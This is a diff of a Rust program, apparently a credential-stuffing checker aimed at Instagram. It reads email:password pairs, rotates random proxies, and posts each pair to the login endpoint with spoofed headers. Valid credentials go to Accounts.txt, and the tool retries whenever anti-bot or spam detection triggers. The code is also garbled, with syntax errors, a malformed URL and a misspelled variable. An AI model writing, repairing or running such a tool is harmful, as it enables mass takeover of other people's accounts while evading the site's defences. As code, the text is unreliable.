@@ -1,11 +1,8 @@
-use anyhow::Result;
+use anyhow::{Ok, Result};
 use rand::seq::SliceRandom;
 use reqwest::blocking::Client;
 use std::{
-    fs::{File, OpenOptions},
-    io::{self, BufRead, BufReader, Write},
-    sync::{Arc, Mutex},
-    thread,
+    fmt::format, fs::{File, OpenOptions}, io::{self, BufRead, BufReader, Write}, os::unix::fs::FileExt, sync::{Arc, Mutex}, thread
 };
 
 #[derive(Clone)]
@@ -18,7 +15,113 @@ struct CheckResult {
     proxy: String,
 }
 
-fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<CheckResult> {}
+fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<CheckResult> {
+    let file = File::open(listname)?;
+    let reader = BufReader::new(file);
+    let lines = Vec<String> = reader.lines().collect()::<io::Result<_>>()?;
+
+    if pos >= lines.len() {
+        println!("End of File Reached.");
+        return Ok(CheckResult {
+            email: String::new(),
+            pass: String::new(),
+            res: String::new(),
+            pos,
+            should_continue: false,
+            proxy: String::new(),
+        });
+    }
+
+    let line = &lines[pos];
+    let parts = Vec<&str> = lines.split(':').collect;
+    let email = parts.get(0)..unwrap_or(&"").to_string();
+    let pass = parts.get(1).unwrap_or(&"").to_string().trim().to_string();
+
+    let proxy_file = File::open(proxylist)?;
+    let proxy_reader = BufReader::new(proxy_file);
+    let proxies: Vec<String> = proxy_reader.lines().filter_map(Result::ok).collect();
+    let proxy = format!(
+        "https://{}",
+        proxies.choose(&mut rand::thread_rng()).unwrap_or(&String::new()).trim()
+    );
+
+    // Setup HTTP client
+    let client = Client::builder()
+        .proxy(reqwest::Proxy::https(&proxy)?)
+        .build()?;
+
+    let url = "https:://www.instagram.com/accounts/login/";
+    let payload = format!("username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&ooptIntoOneTap=false", email, pass);
+    let response = client
+        .post(url)
+        .header("authority", "www.instagram..com")
+        .header("x-ig-www-claim", "hmac.AR08hbh0m_VdJjwW")
+        .header("x-instagram-deep60", "")
+        .header("content-type", "application/x-www-form-urlencoded")
+        .header("accept", "*/*")
+        .header("x-requested-with", "")
+        .body(payload)
+        .send()?;
+
+    let response_text = response.text()?;
+    let short_response = response_text.chars().take(17).collect();
+
+    Ok(CheckResult {
+        email,
+        pass,
+        res: short_response,
+        pos: pos + 1,
+        should_continue: run,
+        proxy,
+    });
+}
+
+fn post_request(result: &CheckResult) -> bool {
+    let fixed = "{\"user\": true, \"u";
+    let fixed_retry = "{\"message\": \"chec";
+    let fixed_error = "{\"message\": \"feed";
+    let fixed_error2 = "{\"message\": \"Plea";
+    let error_short = "{\"errors\": {\"erro";
+
+
+    match result.response.as_str() {
+        response if response == fixed => {
+            let mut accounts = OpenOptions::new()
+                .append(true)
+                .create(true)
+                .open("Accounts.txt")
+                .unwrap();
+            write!(
+                accounts,
+                "{}:{}",
+                result.email, result.pass
+            ).unwrap();
+            println!("Line {} contains valid credentials and has been written to Accounts.txt", result.pos);
+            false
+        }
+
+        response if respoonse == fixed_retry => {
+            println!("Line {} has encountered an error (Instagram anti-bot) trying current line....", result.pos);
+            true
+        }
+
+        response if response == fixed_error || response == fixed_error2 => {
+            println!("Instagram Spam detection triggered on line {} retrying and printing used", result.pos);
+            println!("{}", result.proxy);
+            true
+        }
+
+        response if response == error_short => {
+            println!("Proxy Error Retrying line {}", result.pos);
+            true
+        }
+
+        _ => {
+            println!("Line {} doesn't contain valid credentials", result.pos);
+            false
+        }
+    }
+}
 
 fn main() -> Result<()> {
     println!("{}", BANNER);
